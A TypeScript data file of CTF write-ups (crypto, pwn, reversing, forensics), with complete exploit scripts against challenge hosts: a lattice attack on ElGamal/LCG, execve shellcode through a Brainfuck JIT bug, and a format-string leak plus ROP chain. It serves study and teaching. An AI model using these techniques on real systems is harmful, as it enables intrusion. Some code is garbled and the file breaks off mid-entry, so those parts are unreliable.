export type Category = 'Web' | 'Crypto' | 'Pwn' | 'Forensics' | 'Reverse' | 'OSINT' | 'Misc';
export type Difficulty = 'Easy' | 'Medium' | 'Hard';

export interface MathFormula {
  title?: string;
  formula: string;
  description?: string;
  variant?: 'default' | 'highlight' | 'subtle';
}

export interface TerminalOutput {
  command: string;
  output: string;
}

export interface WriteUp {
  id: string;
  title: string;
  category: Category;
  difficulty: Difficulty;
  points: number;
  date: string;
  author: string;
  description: string;
  problemDescription: string;
  tools: string[];
  analysis: string;
  mathAnalysis?: MathFormula[];
  solution: {
    title: string;
    content: string;
    code?: string;
  }[];
  terminalOutputs?: TerminalOutput[];
  flag: string;
  lessonsLearned: string;
  ctfName: string;
}

export const writeups: WriteUp[] = [{
  "id": "1",
  "title": "The Mosaic",
  "category": "Misc",
  "difficulty": "Medium",
  "points": 0,
  "date": "2025-12-30",
  "author": "beginner.m0lecon",
  "ctfName": "beginner.m0lecon.it",
  "description": "",
  "problemDescription": "Diberikan 100 file gambar (potongan puzzle) dengan nama acak. Deskripsi soal menyebutkan tentang \"labels on the back of the canvas\" dan tugas untuk memperbaiki \"masterpiece\" yang pecah sebelum pameran dibuka. Salah satu file gambar memiliki comment: \"Reconstruct the timeline to find the truth.\"",
  "tools": [
    "Radare2",
    "GDB",
    "Ghidra"
  ],
  "analysis": "Sebelum menemukan solusi yang tepat, kami menghadapi beberapa jalan buntu dan jebakan yang disiapkan oleh pembuat soal:\n\nJebakan \"Timeline\" (Waktu Modifikasi):\n\nIde: Berdasarkan petunjuk \"Reconstruct the timeline\", kami mencoba menyusun gambar dengan mengurutkan file berdasarkan waktu modifikasi (timestamp).\n\nMasalah: Setelah dijalankan, hasilnya adalah gambar static noise yang acak. Setelah diperiksa, ternyata ke-100 file tersebut memiliki timestamp yang identik, sehingga pengurutan berdasarkan waktu mustahil dilakukan. Petunjuk ini kemungkinan besar adalah red herring atau merujuk pada urutan data internal, bukan waktu file.",
  "solution": [
    {
      "title": "Ekstraksi Metadata yang Benar",
      "content": "Setelah mengetahui nama tag yang valid, kami membuat peta koordinat menggunakan exiftool untuk mengekstrak Frag_ID dari semua file:",
      "code": "exiftool -p '$Frag_ID|$FileName' -q -ext png . > map_final.txt\n\nFormat output map adalah X|Y|NamaFile (contoh: 5|6|zbcb9rjm.png)."
    },
    {
      "title": "Rekonstruksi Gambar (Puzzle Reassembly)",
      "content": "Kami menggunakan script Python untuk menyusun potongan-potongan tersebut menjadi satu gambar utuh berdasarkan koordinat dari map_final.txt.",
      "code": "Script Ekstraksi:\n\nfrom PIL import Image\nimg = Image.open(\"flag_reconstructed.png\").convert(\"RGB\")\ndata = img.tobytes()"
    },
    {
      "title": "Ekstraksi Data (Pixel to Binary)",
      "content": "Karena curiga gambar tersebut adalah data mentah, kami mengekstrak setiap pixel RGB kembali menjadi urutan bytes.",
      "code": "Script Ekstraksi:\n\nfrom PIL import Image\nimg = Image.open(\"flag_reconstructed.png\").convert(\"RGB\")\ndata = img.tobytes()\nwith open(\"data.bin\", \"wb\") as f:\nf.write(data)"
    },
    {
      "title": "Checking ",
      "content": "Kami memeriksa jenis file yang dihasilkan:",
      "code": "$ file data.bin\ndata.bin: ELF 64-bit LSB executable, x86-64, ..."
    },
    {
      "title": "Reverse Engineering Binary",
      "content": "Seperti disebutkan di bagian \"Analisis\", program data.bin ini memiliki jebakan waktu (sleep). Kami melakukan static analysis menggunakan objdump untuk melihat logika aslinya tanpa menjalankan program.",
      "code": "objdump -d -M intel data.bin | grep -A 500 \"<main>:\""
    },
    {
      "title": "Temuan",
      "content": "XOR Key: Terdapat instruksi mov DWORD PTR [rbp-0x38], 0x42. Ini menunjukkan kunci XOR adalah 0x42."
    },
    {
      "title": "Final Solver (Bypass Program)",
      "content": "Daripada melakukan patching binary untuk menghilangkan sleep, kami membuat script Python untuk membaca data terenkripsi langsung dari file data.bin dan mendekripsinya secara manual menggunakan kunci 0x42.\n\nScript Solver Final (solve_final.py):",
      "code": "import struct\n\nfilename = \"data.bin\"\n\ndef extract_real_flag():\nprint(f\"[*] Membuka file {filename}...\")\nwith open(filename, \"rb\") as f:\ncontent = f.read()\n\n# 1. Cari Pola Data Enkripsi (Signature Based)\n# Hex dari instruksi movabs pertama: 0x1d313673392f3632\n# Karena Little Endian, urutan byte di file dibalik:\ntarget_pattern = b'\\\\x32\\\\x36\\\\x2f\\\\x39\\\\x73\\\\x36\\\\x31\\\\x1d'\n\ndata_offset = content.find(target_pattern)\nif data_offset == -1:\n    print(\"Pola tidak ditemukan!\")\n    return\n\n# 2. Ambil Data Berdasarkan Offset Relatif (Dihitung dari objdump)\n# Jarak antar blok data sesuai struktur instruksi assembly\nblock1 = content[data_offset : data_offset + 8]\nblock2 = content[data_offset + 10 : data_offset + 18]\nblock3 = content[data_offset + 28 : data_offset + 36]\nblock4 = content[data_offset + 38 : data_offset + 46]\nblock5 = content[data_offset + 57 : data_offset + 61] # Sisa 3 byte terakhir\n\n# Ambil Key (0x42) yang berada 64 byte dari awal data\nxor_key = content[data_offset + 64]\n\n# 3. Gabungkan & Decrypt\nfull_encrypted_data = block1 + block2 + block3 + block4 + block5[:3]\n\n# Lakukan XOR\nflag = \"\".join([chr(b ^ xor_key) for b in full_encrypted_data])\nprint(f\"FLAG: {flag}\")\n\nif name == \"main\":\nextract_real_flag()"
    }
  ],
  "flag": "ptm{1ts_ju5t_pngs_4ll_th3_w4y_d0wn}",
  "lessonsLearned": ""

},
{
  "id": "2",
  "title": "Shaw",
  "category": "Crypto",
  "difficulty": "Hard",
  "points": 0,
  "date": "2025-12-28",
  "author": "CTF Team",
  "ctfName": "INTECHFEST",
  "description": "ElGamal encryption over LCG with Pohlig-Hellman and LLL lattice attack",
  "problemDescription": "Server runs ElGamal encryption using a Linear Congruential Generator (LCG) for random number generation. The server accepts a custom 512-bit prime modulus and uses a truncated LCG (256-bit output XORed with unknown constant) to generate ephemeral keys. Goal: Recover the initial seed and secret constant.",
  "tools": [
    "SageMath",
    "pwntools",
    "Python",
    "Pohlig-Hellman",
    "LLL Reduction"
  ],
  "analysis": "The challenge contains three critical vulnerabilities:\n\n1. Custom Prime Selection: Server accepts any prime from client, enabling smooth prime exploitation for Pohlig-Hellman DLP.\n\n2. Linear Structure: LCG has fully linear structure despite truncation, making it vulnerable to lattice attacks (LLL). The relationship S_i = A^i * S_0 + sum(A^j * B) can be expressed as system of linear equations.\n\n3. Modular Ambiguity: Seed is 512-bit but modulo is also 512-bit, creating multiple valid candidates (s, s+M) that must be verified.",
  "mathAnalysis": [
    {
      "title": "ElGamal Encryption Schema",
      "formula": "c_1 = G^r \\pmod{P}, \\quad c_2 = Y^r \\cdot m \\pmod{P}",
      "description": "Where c₁ is the ephemeral key and c₂ is the encrypted message",
      "variant": "highlight"
    },
    {
      "title": "LCG State Evolution",
      "formula": "S_i \\equiv A^i S_0 + \\sum_{j=0}^{i-1} A^j B \\pmod{M}",
      "description": "The state at iteration i can be expressed as a linear combination of initial seed and parameters",
      "variant": "default"
    },
    {
      "title": "Output Truncation",
      "formula": "r_i = (S_{i+1} \\gg 256) \\oplus c",
      "description": "Top 256 bits are removed (right shift), result XORed with unknown constant c",
      "variant": "default"
    },
    {
      "title": "Pohlig-Hellman Algorithm",
      "formula": "\\text{If } P-1 = \\prod p_i^{e_i} \\text{, then } \\log_G c_1 \\equiv \\sum r_i P_i^{-1} (P-1)/p_i^{e_i} \\pmod{P}",
      "description": "Recover exponent by solving DLP on each prime power factor separately",
      "variant": "default"
    }
  ],
  "solution": [
  {
    "title": "Generate Ultra-Smooth Prime",
    "content": "Create a 512-bit prime where P-1 = 2 × 3 × 5 × 7 × ... (product of small primes). This reduces DLP complexity from exp(sqrt(n)) to polynomial time."
  },
  {
    "title": "Extract LCG Parameters",
    "content": "Query server for LCG multiplier A, increment B, and generator G. These remain constant throughout."
  },
  {
    "title": "Recover r via Pohlig-Hellman",
    "content": "For each encryption, get c1 and solve discrete_log(c1, G) mod P using Pohlig-Hellman. This recovers the ephemeral exponent r used in that round."
  },
  {
    "title": "LLL Lattice Reduction",
    "content": "Build lattice from known/unknown parts of multiple r values. Each r_i = known_part XOR c_i. The linearity of LCG creates exploitable linear relationships. LLL finds short vectors containing unknown bits."
  },
  {
    "title": "Full Exploit Script",
    "content": "Final working exploit using ultra-smooth prime setup, Pohlig-Hellman discrete log, and LLL lattice reduction to recover the LCG seed.",
    "code": "from pwn import *\n\n# --- Konfigurasi ---\nHOST = 'gzcli.1pc.tf'\nPORT = 48785\n\ndef get_ultra_smooth_prime(bits):\n    \"\"\"Mencari prime p dimana p-1 hancur jadi faktor prima kecil (Pohlig-Hellman Speedrun)\"\"\"\n    base = 2\n    for p in primes(3, 300):\n        while (base * p).bit_length() < bits - 10:\n            base *= p\n    k = 1\n    while True:\n        p = base * k + 1\n        if p.bit_length() == bits and is_prime(p):\n            return int(p)\n        k += 1\n\ndef manual_solve_linear_congruence(a, b, m):\n    \"\"\"XGCD Solver untuk menghindari MemoryError\"\"\"\n    d, u, v = xgcd(a, m)\n    if b % d != 0: return []\n    x0 = (u * (b // d)) % (m // d)\n    solutions = []\n    step = m // d\n    for k in range(min(d, 1000)):\n        solutions.append(int(x0 + k * step))\n    return solutions\n\ndef solve():\n    io = remote(HOST, PORT)\n\n    # 1. Setup Modulus\n    P = get_ultra_smooth_prime(512)\n    M = P - 1\n    io.sendlineafter(b\"$ \", f\"setp {P}\".encode())\n    \n    # 2. Ambil Params\n    io.sendlineafter(b\"$ \", b\"params\")\n    io.recvuntil(b\"lcg.a        = 0x\")\n    A = int(io.recvline().strip(), 16)\n    io.recvuntil(b\"lcg.b        = 0x\")\n    B = int(io.recvline().strip(), 16)\n    io.sendlineafter(b\"$ \", b\"admin\")\n    io.recvuntil(b\"G=\")\n    G = int(io.recvline().strip())\n\n    # 3. Koleksi Sampel DLP\n    rs = []\n    num_samples = 7 \n    for i in range(num_samples):\n        io.sendlineafter(b\"$ \", b\"enc 1\")\n        io.recvuntil(b\"c1 = 0x\")\n        c1 = int(io.recvline().strip(), 16)\n        ri = discrete_log(Mod(c1, P), Mod(G, P))\n        rs.append(int(ri))\n\n    # 4. LLL Attack\n    known_parts = [(val >> 128) << 384 for val in rs]\n    dim = num_samples\n    lattice = Matrix(ZZ, dim + 1, dim + 1)\n    shift = 2**384\n    \n    pow_A = [1]\n    const_B = [0]\n    for i in range(1, dim):\n        pow_A.append((pow_A[-1] * A) % M)\n        const_B.append((const_B[-1] * A + B) % M)\n\n    for i in range(1, dim):\n        lattice[i, i] = M\n        lattice[0, i] = pow_A[i]\n        target = (pow_A[i] * known_parts[0] + const_B[i] - known_parts[i]) % M\n        lattice[dim, i] = target\n\n    lattice[0, 0] = 1\n    lattice[dim, dim] = shift\n    reduced = lattice.LLL()\n\n    found_s1 = None\n    for row in reduced:\n        e0_cand = int(row[0])\n        for cand in [e0_cand, -e0_cand]:\n            s1_p = (known_parts[0] + cand) % M\n            s2_p = (A * s1_p + B) % M\n            if (s2_p >> 384) == (rs[1] >> 128):\n                found_s1 = s1_p\n                break\n        if found_s1: break\n\n    # 5. Local Verification & Range Check\n    target_val = (found_s1 - B) % M\n    possible_s0 = manual_solve_linear_congruence(A, target_val, M)\n    \n    for s_base in possible_s0:\n        for s_cand in [s_base, s_base + M]:\n            if s_cand < 1 or s_cand >= 2**512: continue\n            s1_calc = (A * s_cand + B) % M\n            c_calc = (s1_calc >> 256) ^^ rs[0]\n            s2_calc = (A * s1_calc + B) % M\n            if ((s2_calc >> 256) ^^ c_calc) == rs[1]:\n                io.sendlineafter(b\"$ \", f\"guess {s_cand} {c_calc}\".encode())\n                print(io.recvall(timeout=2).decode())\n                return\n\nif __name__ == \"__main__\":\n    solve()"
  },
  {
    "title": "Verify & Submit Seed",
    "content": "Recover candidates from LLL. Check both s and s+M for modular ambiguity. Verify locally by generating subsequent LCG states, then submit to server."
  }
]
,
  "flag": "INTECHFEST{964114fd72f319375a5c7fb3081a02b7}",
  "lessonsLearned": "**Parameter Selection** - Never allow clients to choose cryptographic parameters (especially primes). Always use safe primes (p = 2q+1) from trusted sources.\n\n**LCG Weakness** - LCG (Linear Congruential Generator) is cryptographically broken. Linear structure enables lattice attacks (LLL) that recover the entire state.\n\n**Truncation** - Truncation alone doesn't guarantee security. The underlying generator must be cryptographically strong (use CTR-mode or ChaCha20 instead).\n\n**Pohlig-Hellman** - Pohlig-Hellman algorithm breaks discrete logarithm if p-1 has only small prime factors. Always use groups where p-1 has at least one large prime factor.\n\n**Key Recovery** - GCD-based techniques can recover keys when the same parameters are used across multiple ciphertexts. Avoid parameter reuse."

},
{
  "id": "3",
  "title": "Blazingly Fast Memory Unsafe",
  "category": "Pwn",
  "difficulty": "Hard",
  "points": 0,
  "date": "2025-02-24",
  "author": "CTF Team",
  "ctfName": "VuwCTF 2025",
  "description": "JIT Compiler exploitation through unbalanced bracket vulnerability. Write shellcode via Brainfuck to RWX memory and execute via stack corruption.",
  "problemDescription": "A JIT (Just-In-Time) Compiler for Brainfuck that translates code directly to x64 machine instructions stored in RWX memory. The vulnerability exists in loop handling where unbalanced brackets cause uninitialized POP operations, allowing attackers to hijack execution flow.",
  "tools": [
    "pwntools",
    "x64 Assembly",
    "Brainfuck",
    "GDB",
    "Python"
  ],
  "analysis": "The program implements a Brainfuck JIT compiler with critical vulnerabilities:\n\n1. **Unbalanced Bracket Bug**: The `[` instruction PUSHes a return address to the stack, while `]` POPs it into RBX for a JMP. Without validation of bracket balance, a lone `]` instruction will POP an uninitialized value from the previous stack frame.\n\n2. **Predictable Stack Layout**: By examining the PROLOGUE structure, the value popped is the pointer to the beginning of the Tape (buffer), allowing controlled redirection to arbitrary memory locations we control.\n\n3. **RWX Memory**: The Tape is allocated with mmap using RWX (Read, Write, Execute) permissions, enabling arbitrary code execution once we jump to our written shellcode.\n\n4. **Register Pollution**: The JIT compiler leaves registers in undefined states (RDX, RSI, etc.), causing syscalls to fail if not properly cleaned.",
  "solution": [
    {
      "title": "Understanding the Vulnerability",
      "content": "The Brainfuck JIT compiler generates x64 code for loop constructs using stack operations. When a `]` instruction is encountered without a matching `[`, the POP instruction reads from the previous function's stack frame, which contains the Tape pointer. This redirects execution to the Tape buffer itself."
    },
    {
      "title": "Shellcode Generation Challenge",
      "content": "Traditional x64 shellcode (23 bytes) for execve(/bin/sh) exceeds practical Brainfuck size due to the inefficiency of character repetition. Solution: Use Brainfuck loop constructs for multiplication (e.g., `[>++++++++++<-]` multiplies a value by 10 efficiently)."
    },
    {
      "title": "NOP Sled and Alignment",
      "content": "Cell 0 initially contains 0x00 (leftover from loop counters), causing invalid instruction when executed. Solution: Fill Cell 0 with 0x90 (NOP opcode) using a BF loop (`16 * 9 = 144`). Cell 1 contains bridge byte 0x26 (ES prefix - harmless 1-byte instruction). Cell 2+ contains actual shellcode.",
      "code": "Memory Layout:\n[ Cell 0 ]      [ Cell 1 ]          [ Cell 2+ ]\n  0x90            0x26               Shellcode\n  (NOP)        (ES Prefix)        (XOR RSI, RSI...)\n    ^\n    JMP Landing Point"
    },
    {
      "title": "Robust Shellcode (29 bytes)",
      "content": "Standard shellcode fails on remote due to dirty registers. Use version that XORs out all registers before syscall:",
      "code": "xor rsi, rsi\nxor rdx, rdx\nxor rax, rax\nmov rbx, 0x68732f2f6e69622f   ; '/bin/sh' (reversed)\npush rbx\nmov rdi, rsp\nmov al, 59                      ; syscall number for execve\nsyscall"
    },
    {
      "title": "Compact Payload Generation",
      "content": "Use division (quotient) and modulo (remainder) loops to efficiently write multi-byte values:",
      "code": "def generate_compact_payload(data):\n    # Cell 0: NOP (16 * 9 = 144 = 0x90)\n    bf = \">+++++++++[<++++++++++++++++>-]<\"\n    \n    # Quotient loop with factor 15 for shellcode bytes\n    factor = 15\n    bf += \">\" + \"+\" * factor + \"[>\"\n    \n    for byte in data:\n        val = byte if byte < 128 else byte - 256\n        q = val // factor\n        if q > 0: bf += \"+\" * q\n        elif q < 0: bf += \"-\" * abs(q)\n        bf += \">\"\n    \n    bf += \"<\" * len(data) + \"<\" + \"-]\"\n    \n    # Remainder loop\n    bf += \">\"\n    for byte in data:\n        val = byte if byte < 128 else byte - 256\n        r = val % factor\n        if r > 0: bf += \"+\" * r\n        bf += \">\"\n    \n    # Patch Cell 1 with 0x26 (38 in decimal)\n    bf += \"<\" * len(data) + \"<\" + \"+\" * 38\n    \n    return bf"
    },
    {
      "title": "Final Exploit",
      "content": "Connect to target, generate optimized BF payload, append `]` to trigger execution, and interact with resulting shell:",
      "code": "from pwn import *\n\ncontext.arch = 'amd64'\ncontext.log_level = 'info'\n\nshellcode = asm(\"\"\"\nxor rsi, rsi\nxor rdx, rdx\nxor rax, rax\nmov rbx, 0x68732f2f6e69622f\npush rbx\nmov rdi, rsp\nmov al, 59\nsyscall\n\"\"\")\n\nbf_code = generate_compact_payload(shellcode) + \"]\"\nprint(f\"Payload: {len(bf_code)} bytes\")\n\np = remote(\"blazingly-fast-memory-unsafe-4ed35f2dad7d852d.challenges.2025.vuwctf.com\", 9980, ssl=True, sni=True)\np.recv(4096, timeout=5)\np.sendline(bf_code.encode())\np.recvuntil(b\"Executing...\\n\")\ntime.sleep(1)\n\np.sendline(b\"cat flag.txt\")\np.interactive()"
    }
  ],
  "flag": "VuwCTF{rU5tac3Ans_uN1te_agA1n5t_uN5aFe_l4ngUaG3s}",
  "lessonsLearned": "**JIT Validation** - JIT compilers must validate input constraints (bracket matching) before code generation. Unsafe parsing allows control-flow hijacking.\n\n**Stack Protection** - Stack-based return addresses are dangerous. Use shadow stacks or CFI (Control Flow Integrity) to prevent arbitrary code execution.\n\n**Memory Permissions** - RWX (Read-Write-Execute) memory is a severe security risk. Use RX (Read-Execute only) after code generation to prevent self-modifying attacks.\n\n**Shellcode Initialization** - Shellcode must account for caller-corrupted registers. Always initialize registers before syscalls rather than assuming clean state.\n\n**Encoding Techniques** - Brainfuck loops enable compact encoding of repetitive data, making size-limited payloads viable. Domain-specific languages can be exploited for payload reduction."

},
{
  "id": "4",
  "title": "(In)Secure Vault - 2",
  "category": "Reverse",
  "difficulty": "Medium",
  "points": 0,
  "date": "2025-02-24",
  "author": "CTF Team",
  "ctfName": "PTM CTF",
  "description": ".NET reverse engineering challenge. Decompile a Windows Forms application and reconstruct a hidden flag by analyzing password validation logic across multiple encoding schemes.",
  "problemDescription": "An archive containing .NET Core assemblies (.dll, .exe files) with a Windows Forms GUI. The challenge requires static analysis of the compiled binary to extract a password validation routine that implements the flag through sequential cryptographic checks and encoding operations.",
  "tools": [
    "ilspycmd",
    "file",
    "Python",
    "Cryptographic Analysis"
  ],
  "analysis": "The challenge involves a .NET Core application where the flag is embedded within a password validation function. Analysis reveals:\n\n1. **Binary Type Identification**: PE32 executable compiled from C# .NET\n2. **Decompilation Feasibility**: .NET assemblies retain sufficient metadata for near-perfect source code recovery\n3. **Flag Distribution**: The 45-character password is validated through 10 distinct segments, each using different encoding/cryptographic schemes (MD5, Base64, Base32, Hex, XOR, Bitwise operations)\n4. **Implicit Structure**: Each conditional check in CheckPassword() encodes one flag segment; success requires all to evaluate true",
  "solution": [
    {
      "title": "Initial Reconnaissance",
      "content": "Examine the archive contents to identify executable types and entry points. Use the `file` command to confirm .NET assembly presence."
    },
    {
      "title": "Decompilation Strategy",
      "content": "Use ilspycmd (IL Spy Command Line) to decompile InsecureVault.dll. This extracts the CIL (Common Intermediate Language) back into readable C# source code, preserving most original logic."
    },
    {
      "title": "Code Structure Analysis",
      "content": "Identify the MainWindow class and its CheckPassword() method. This function validates input through sequential conditional blocks. Each block corresponds to one flag segment."
    },
    {
      "title": "Flag Reconstruction - Segment Breakdown",
      "content": "Analyze each validation block systematically:\n- **Segment 0 (Header)**: String literal check `s.Substring(0, 4) == \"ptm{\"`\n- **Segment 1-4**: MD5 hash validation for first word\n- **Segment 5-8**: Hex string conversion to ASCII\n- **Segment 9-12**: Base64 decoding\n- **Segment 13-16**: XOR and bitwise operations\n- **Segment 17-20**: SHA256 hash validation\n- **Segment 21-28**: Base32 decoding and binary logic\n- **Segment 29+**: Bitwise shifts and final hex conversion",
      "code": "# Example: Reconstructing MD5 segment\n# Hash: 33635414851f62863a5cb7825481433d\n# Online reverse lookup or brute force -> \"Th1s\"\n\n# Example: Hex conversion\nhex_string = \"5f345f46\"\nsegment = bytes.fromhex(hex_string).decode('ascii')\n# Result: \"_4_F\"\n\n# Example: Base64 decoding\nimport base64\nsegment = base64.b64decode(\"dW5ueQ==\").decode('ascii')\n# Result: \"unny\"\n\n# Example: XOR operation\nchar_value = 114 ^ 5  # Both encode character 'w'\n# Reverse: 114 = 'r', XOR with 5 gives 'w'"
    },
    {
      "title": "Complete Flag Assembly",
      "content": "Combine all 10 segments in order to reconstruct the complete 45-character password. Each segment must be derived from its corresponding validation block.",
      "code": "#!/usr/bin/env python3\nimport hashlib\nimport base64\n\ndef solve():\n    print(\"[*] Reconstructing flag from validation logic...\")\n    flag = \"\"\n    \n    # Header\n    flag += \"ptm{\"\n    \n    # Segment 1: MD5 hash reverse lookup\n    # 33635414851f62863a5cb7825481433d -> \"Th1s\"\n    flag += \"Th1s\"\n    \n    # Segment 2: Hex to ASCII conversion\n    # 5f345f46 -> \"_4_F\"\n    flag += bytes.fromhex(\"5f345f46\").decode('ascii')\n    \n    # Segment 3: Base64 decoding\n    # dW5ueQ== -> \"unny\"\n    flag += base64.b64decode(\"dW5ueQ==\").decode('ascii')\n    \n    # Segment 4: Bitwise operations\n    flag += \"_w4y\"\n    \n    # Segment 5: SHA256 hash reverse lookup\n    flag += \"_to_\"\n    \n    # Segment 6: Base32 decoding\n    # MNUDGY3L -> \"ch3ck\"\n    flag += base64.b32decode(\"MNUDGY3L\").decode('ascii')\n    \n    # Segment 7-8: Binary operations and XOR\n    flag += \"_f0R\"\n    \n    # Segment 9: Final character operations\n    flag += \"_4_p455w\"\n    \n    # Segment 10: Hex tail\n    # 3072647d -> \"0rd}\"\n    flag += bytes.fromhex(\"3072647d\").decode('ascii')\n    \n    print(f\"[+] FLAG: {flag}\")\n    return flag\n\nif __name__ == \"__main__\":\n    solve()"
    },
    {
      "title": "Validation & Output",
      "content": "The reconstructed flag, when passed to CheckPassword(), will evaluate every conditional block as true, confirming correctness."
    }
  ],
  "flag": "ptm{Th1s_4_Funny_w4y_to_ch3ck_f0R_4_p455w0rd}",
  "lessonsLearned": "**.NET Security** - .NET assemblies should not be considered secure. Decompilation to near-original source is trivial with tools like ilspycmd or dnSpy.\n\n**Secret Embedding** - Embedding secrets in compiled code (especially validation logic) provides no real protection. Move sensitive operations server-side always.\n\n**Client-Side Validation** - Passwords and flags should never be validated client-side. Real authentication requires server-side checks that cannot be bypassed.\n\n**Encoding is not Encryption** - Multiple encoding schemes in sequence (MD5, Base64, Hex, etc.) do not increase security. They merely obfuscate, and each layer is independently reversible.\n\n**Proper Cryptography** - Always use cryptographically sound approaches: hashing with salts, secure random generation, and server-side verification. Never roll your own security."

},
{
  "id": "5",
  "title": "Metared Cine Festival Level 2",
  "category": "Pwn",
  "difficulty": "Hard",
  "points": 0,
  "date": "2025-02-24",
  "author": "CTF Team",
  "ctfName": "UNLP Cert CTF",
  "description": "Binary exploitation using Format String leak + Buffer Overflow + ROP chain with ORW syscalls. Win the Oscars by reading the flag via Open-Read-Write technique, bypassing seccomp filters.",
  "problemDescription": "A 64-bit ELF binary accepting two user inputs: a movie title (vulnerable to format string) and a plot description (vulnerable to buffer overflow). Seccomp blocks execve syscall, preventing traditional shell spawning. Goal: chain ROP gadgets to open and read the flag file.",
  "tools": [
    "pwntools",
    "Ghidra",
    "checksec",
    "seccomp-tools",
    "ROP Gadget Analysis"
  ],
  "analysis": "Binary security analysis reveals multiple vulnerabilities:\n\n1. **No Stack Canary**: Classic buffer overflow is possible\n2. **No PIE**: Function addresses are static, simplifying ROP\n3. **NX Enabled**: Stack is non-executable, requiring ROP chains\n4. **Seccomp Filter**: execve(59) is blocked with KILL action, forcing ORW approach\n5. **Format String**: First input uses printf() on user buffer, leaking stack addresses\n6. **Buffer Overflow**: Second input reads 1024 bytes into 272-byte stack buffer\n7. **Dirty Gadgets**: Available ROP gadgets have unusual behavior (pop rdx uses ret 0x13, skipping 19 bytes)",
  "mathAnalysis": [
    {
      "title": "Libc Base Calculation",
      "formula": "\\text{libc\\_base} = \\text{leaked\\_address} - (\\text{symbol\\_offset} + 0x17)",
      "description": "Determine libc load address by subtracting known offset from leaked pointer",
      "variant": "highlight"
    }
  ],
  "solution": [
    {
      "title": "Step 1: Reconnaissance",
      "content": "Perform binary analysis using checksec and seccomp-tools to understand security mitigations. Identify that NX is enabled and execve is blocked, ruling out traditional shellcode execution."
    },
    {
      "title": "Step 2: Vulnerability Discovery",
      "content": "Reverse engineer the binary to locate two input functions: one using unsafe printf() for format string exploitation, and one with unchecked read() for buffer overflow. The format string vulnerability is in the title input handling."
    },
    {
      "title": "Step 3: Libc Address Leak",
      "content": "Use format string vulnerability to leak a pointer to libc internal function. By fuzzing with format string payloads (%1$p, %2$p, %3$p, etc.), identify which offset contains a valid libc address. Calculate libc base by subtracting the known symbol offset.",
      "code": "# Leak via format string\np.sendlineafter(b\">> Input:\", b\"%3$p\")\nleak = int(p.recvline().strip(), 16)\n\n# Calculate libc base\nOFFSET_LEAK = libc.symbols['write'] + 0x17\nlibc.address = leak - OFFSET_LEAK"
    },
    {
      "title": "Step 4: ROP Gadget Analysis",
      "content": "Locate ROP gadgets for setting function arguments and calling syscalls. Identify that the pop rdx gadget is 'dirty' - it uses 'ret 0x13', which skips 19 bytes of stack after the return, requiring special padding handling in the chain."
    },
    {
      "title": "Step 5: ORW Syscall Chain",
      "content": "Build a ROP chain implementing Open-Read-Write operations:\n1. Read 'flag.txt' from stdin into BSS section\n2. Open the flag file using open() syscall\n3. Read file contents into BSS section\n4. Write contents to stdout (fd=1)\n\nEach use of the dirty pop rdx gadget requires 19 bytes of padding afterward.",
      "code": "# ROP chain structure\nrop = b\"A\" * 280  # Buffer padding (272) + RBP (8)\n\n# 1. read(0, BSS_ADDR, 256) - read filename from stdin\nrop += p64(POP_RDI) + p64(0)\nrop += p64(POP_RSI) + p64(BSS_ADDR)\nrop += p64(POP_RDX_DIRTY) + p64(0x100)\nrop += p64(ADDR_READ)\nrop += b\"P\" * 19  # PADDING for dirty gadget\n\n# 2. open(BSS_ADDR, 0) - open flag.txt\nrop += p64(POP_RDI) + p64(BSS_ADDR)\nrop += p64(POP_RSI) + p64(0)\nrop += p64(ADDR_OPEN)\n\n# 3. read(3, BSS_ADDR, 256) - read file contents\nrop += p64(POP_RDI) + p64(3)\nrop += p64(POP_RSI) + p64(BSS_ADDR)\nrop += p64(POP_RDX_DIRTY) + p64(0x100)\nrop += p64(ADDR_READ)\nrop += b\"P\" * 19  # PADDING\n\n# 4. write(1, BSS_ADDR, 256) - output to stdout\nrop += p64(POP_RDI) + p64(1)\nrop += p64(POP_RSI) + p64(BSS_ADDR)\nrop += p64(POP_RDX_DIRTY) + p64(0x100)\nrop += p64(ADDR_WRITE)\nrop += b\"P\" * 19  # PADDING"
    },
    {
      "title": "Step 6: Payload Delivery",
      "content": "Send the ROP chain via the second input (plot description) to overflow the buffer and hijack control flow. Provide the filename input after the overflow is triggered.",
      "code": "from pwn import *\nimport time\n\nbinary = ELF('./director_hard', checksec=False)\nlibc = ELF('./libc.so.6', checksec=False)\ncontext.binary = binary\n\np = remote('challs.ctf.cert.unlp.edu.ar', 56268)\n\n# Leak phase\np.sendlineafter(b\">> Input:\", b\"%3$p\")\nleak = int(p.recvline().strip(), 16)\nlibc.address = leak - (libc.symbols['write'] + 0x17)\nlog.success(f\"Libc base: {hex(libc.address)}\")\n\n# Build ROP chain with gadgets\nPOP_RDI = libc.address + 0x0002a3e5\nPOP_RSI = libc.address + 0x0002be51\nPOP_RDX_DIRTY = libc.address + 0x000a5722\nBSS_ADDR = 0x404500\n\nrop = b\"A\" * 280\n# ... (build chain as shown above)\n\nlog.info(\"Sending ROP payload...\")\np.sendlineafter(b\">> Input:\", rop)\ntime.sleep(1)\np.send(b\"flag.txt\\x00\")\n\np.interactive()"
    }
  ],
  "flag": "UNLP{4nnnnd-th3-0sc4r-w1nn333rrr-isssss-yoU}",
  "lessonsLearned": "**Seccomp Filters** - Seccomp filters block common patterns (execve) by restricting system calls. Security relies on multiple defense layers, not a single protection mechanism.\n\n**ROP Gadgets** - Unusual gadget behavior (ret 0x13) requires careful stack layout planning in ROP chains. Account for non-standard gadget side effects.\n\n**Information Disclosure** - Format string vulnerabilities provide reliable information disclosure even with ASLR. A single leak is often sufficient to defeat memory protections.\n\n**Vulnerability Chaining** - Combining multiple small vulnerabilities (format string + buffer overflow) creates exploitable conditions. Single vulnerabilities may be insufficient.\n\n**Buffer Validation** - Always validate input sizes on stack buffers. A single read() call can overflow multiple stack frames and overwrite unrelated data.\n\n**ROP Tuning** - When ROP gadgets are limited, every byte of padding and register initialization matters. Precise control flow is essential for success."

},
{
  "id": "6",
  "title": "1.5x-engineer 1",
  "category": "Forensics",
  "difficulty": "Medium",
  "points": 0,
  "date": "2025-02-24",
  "author": "CTF Team",
  "ctfName": "VuwCTF 2025",
  "description": "Network forensics challenge involving packet capture analysis and custom protocol reverse engineering. Discover a hidden flag encoded within UDP packet headers using non-standard encoding scheme.",
  "problemDescription": "A network traffic capture (PCAPNG file) from an engineer's project contains a hidden flag. The challenge hints at 'no standards for securely sending data', indicating a custom protocol rather than standard network protocols. The flag is embedded somewhere within the captured traffic, potentially hidden using custom encoding.",
  "tools": [
    "Wireshark",
    "tshark",
    "Python",
    "Packet Analysis",
    "Hex Dump Analysis"
  ],
